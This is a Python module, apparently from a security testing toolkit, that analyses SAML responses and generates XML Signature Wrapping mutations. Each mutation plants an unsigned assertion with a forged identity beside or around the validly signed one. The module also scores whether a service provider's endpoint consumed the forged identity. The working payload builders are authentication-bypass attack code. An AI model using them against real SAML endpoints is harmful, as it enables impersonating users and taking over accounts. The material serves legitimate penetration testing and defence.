"""SAML XML Signature Wrapping (XSW) — structural analysis + differential probe.

SAML responses are XML with a *detached* signature: a `<ds:Signature>` element
whose `<ds:Reference URI="#id">` points at the `<saml:Assertion>` it covers *by
ID*, not by tree position. If the service provider's signature validator
resolves that reference by ID (wherever the referenced element ends up living
in the document) while its separate business logic that actually consumes the
identity picks an assertion by some naive positional rule instead — "the first
`<saml:Assertion>` in the document", "the last one", "whatever is a direct
child of `<samlp:Response>`" — an attacker can relocate the original, validly
signed assertion to a spot the position-based logic won't look at, and plant a
brand new, unsigned, forged assertion in the spot it *will* look at. The
signature still verifies (it covers exactly the content it always did); the
identity the app actually uses is a different, forger-controlled one.

This module implements three representative structural mutations, not the
full academic XSW1-8 taxonomy (Somorovsky et al.) — a small, non-combinatorial
set covering the three naive assertion-selection rules above, mirroring the
same "small representative set, not exhaustive enumeration" discipline
`cmdi_probe`'s separator list and `xxe_probe`'s two lanes already use:

* ``sibling_before`` — forged assertion inserted immediately before the
  original (tests "grabs the first assertion").
* ``sibling_after`` — forged assertion inserted immediately after the
  original (tests "grabs the last assertion").
* ``wrap_extension`` — the original is relocated one level deeper (inside a
  new `<samlp:Extensions>` wrapper) and the forged assertion takes its old
  slot as a direct child of `<samlp:Response>` (tests "only looks at direct
  children of Response").

None of this forges a signature — the original assertion's signature is left
completely untouched, wherever it ends up. The forged assertion is plainly
unsigned. Confirming the attack means resending the mutated document to the
real ACS endpoint and observing whether the forged identity was consumed (see
``saml_xsw_probe`` in ``moonmcp/server.py``).
"""

from __future__ import annotations

import base64
import binascii
import copy
from dataclasses import dataclass
from xml.etree import ElementTree as ET

NS = {
    "samlp": "urn:oasis:names:tc:SAML:2.0:protocol",
    "saml": "urn:oasis:names:tc:SAML:2.0:assertion",
    "ds": "http://www.w3.org/2000/09/xmldsig#",
}
for _prefix, _uri in NS.items():
    ET.register_namespace(_prefix, _uri)

VARIANTS: tuple[str, ...] = ("sibling_before", "sibling_after", "wrap_extension")

DEFAULT_FORGED_NAMEID = "moon-xsw-forged@internal"


def _local(tag: str) -> str:
    return tag.rsplit("}", 1)[-1]


def decode_response(raw: str) -> str:
    """Accept either literal XML or a base64-encoded SAMLResponse (the HTTP-POST
    binding's wire format) and return literal XML text (pure)."""

    text = raw.strip()
    if text.startswith("<"):
        return text
    try:
        # Strip whitespace first: a line-wrapped SAMLResponse (common on the wire)
        # contains newlines that validate=True would reject, silently dropping the
        # decode and skipping all XSW analysis (a false negative).
        decoded = base64.b64decode("".join(text.split()), validate=True)
    except (ValueError, binascii.Error):
        return text
    return decoded.decode("utf-8", "replace")


def parse_structure(xml_text: str) -> dict:
    """Structurally inventory a SAML document (pure, no crypto): every
    `<saml:Assertion>` (its `ID` and `NameID`, in document order) and every
    `<ds:Signature>` (the `ID` its `Reference` claims to cover)."""

    try:
        root = ET.fromstring(xml_text)
    except ET.ParseError as exc:
        return {"error": "unparseable", "detail": str(exc)}

    assertions: list[dict] = []
    signatures: list[dict] = []
    for idx, el in enumerate(root.iter()):
        local = _local(el.tag)
        if local == "Assertion":
            nameid_el = el.find(".//saml:Subject/saml:NameID", NS)
            assertions.append({
                "index": idx,
                "id": el.get("ID"),
                "nameid": nameid_el.text if nameid_el is not None else None,
            })
        elif local == "Signature":
            ref = el.find("ds:SignedInfo/ds:Reference", NS)
            signatures.append({
                "index": idx,
                "reference_uri": ref.get("URI") if ref is not None else None,
            })
    return {
        "root_tag": _local(root.tag),
        "assertion_count": len(assertions),
        "assertions": assertions,
        "signature_count": len(signatures),
        "signatures": signatures,
    }


def assess_wrappable(structure: dict) -> dict:
    """Static risk read of `parse_structure`'s output (pure, no network) — an
    unsigned document or one with multiple assertions / a dangling signature
    reference is exactly the shape XSW thrives on."""

    if "error" in structure:
        return {"assessable": False, "reason": structure["error"]}

    assertion_ids = {a["id"] for a in structure["assertions"] if a["id"]}
    dangling = [s["reference_uri"] for s in structure["signatures"]
                if s["reference_uri"] and s["reference_uri"].lstrip("#") not in assertion_ids]

    notes: list[str] = []
    if structure["signature_count"] == 0:
        notes.append("no <ds:Signature> found at all -- assertions are entirely unauthenticated")
    if structure["assertion_count"] > 1:
        notes.append("multiple <saml:Assertion> elements present -- a common enabler for "
                     "first-wins/last-wins assertion-selection confusion")
    if dangling:
        notes.append("a Signature Reference URI doesn't match any Assertion ID in this "
                     "document -- the signature may cover something other than what's consumed")

    return {
        "assessable": True,
        "unsigned": structure["signature_count"] == 0,
        "multiple_assertions": structure["assertion_count"] > 1,
        "dangling_signature_references": dangling,
        "notes": notes,
    }


def corrupt_signature(xml_text: str) -> str | None:
    """Flip one character of `<ds:SignatureValue>`'s text (pure) — a minimal,
    targeted mutation that guarantees an invalid signature without touching
    anything else, used as the "should definitely be rejected" control.
    Returns None if there's no signature value to corrupt."""

    try:
        root = ET.fromstring(xml_text)
    except ET.ParseError:
        return None
    sig_value = root.find(".//ds:Signature/ds:SignatureValue", NS)
    if sig_value is None or not sig_value.text or not sig_value.text.strip():
        return None
    text = sig_value.text.strip()
    flipped = "A" if text[-1] != "A" else "B"
    sig_value.text = text[:-1] + flipped
    return ET.tostring(root, encoding="unicode")


def build_variant(xml_text: str, variant: str, forged_nameid: str = DEFAULT_FORGED_NAMEID) -> str | None:
    """Build one XSW mutation (pure). Clones the first `<saml:Assertion>`,
    strips any signature from the clone, overwrites its claimed identity with
    *forged_nameid*, and splices it in per *variant*'s topology (see the
    module docstring). Returns None if the document isn't a `<samlp:Response>`
    with at least one assertion (or *variant* is unknown)."""

    if variant not in VARIANTS:
        raise ValueError(f"unknown variant: {variant!r} (expected one of {VARIANTS})")
    try:
        root = ET.fromstring(xml_text)
    except ET.ParseError:
        return None
    if _local(root.tag) != "Response":
        return None
    assertion = root.find("saml:Assertion", NS)
    if assertion is None:
        return None

    forged = copy.deepcopy(assertion)
    for sig in forged.findall("ds:Signature", NS):
        forged.remove(sig)
    nameid_el = forged.find(".//saml:Subject/saml:NameID", NS)
    if nameid_el is not None:
        nameid_el.text = forged_nameid
    else:
        attr_val = forged.find(".//saml:AttributeValue", NS)
        if attr_val is not None:
            attr_val.text = forged_nameid
    orig_id = assertion.get("ID")
    if orig_id:
        forged.set("ID", f"{orig_id}-forged")

    idx = list(root).index(assertion)
    if variant == "sibling_before":
        root.insert(idx, forged)
    elif variant == "sibling_after":
        root.insert(idx + 1, forged)
    else:  # wrap_extension
        wrapper = ET.Element(f"{{{NS['samlp']}}}Extensions")
        root.remove(assertion)
        wrapper.append(assertion)
        root.insert(idx, wrapper)
        root.insert(idx, forged)

    return ET.tostring(root, encoding="unicode")


@dataclass(frozen=True)
class Resp:
    """The minimal, comparable summary of one ACS response."""

    status: int | None
    length: int
    location: str = ""


def assess_variant(*, accepted: Resp, corrupted: Resp, variant: Resp,
                   variant_body: str, accepted_body: str, corrupted_body: str,
                   forged_marker: str) -> dict:
    """Does *variant*'s response show the ACS consumed the forged identity, or
    at least behaved like the accepted baseline rather than the corrupted one
    (pure)? `reflected_forged_identity` is the strongest possible signal — the
    forged marker showing up in a response it never appears in otherwise is
    direct proof the forged, unsigned assertion was consumed."""

    reflected = (bool(forged_marker) and forged_marker in variant_body
                and forged_marker not in accepted_body
                and forged_marker not in corrupted_body)
    matches_accepted = variant.status == accepted.status and variant.status != corrupted.status
    return {
        "reflected_forged_identity": reflected,
        "status": variant.status,
        "length": variant.length,
        "location": variant.location,
        "matches_accepted_baseline": matches_accepted,
        "length_delta_vs_corrupted": variant.length - corrupted.length,
    }
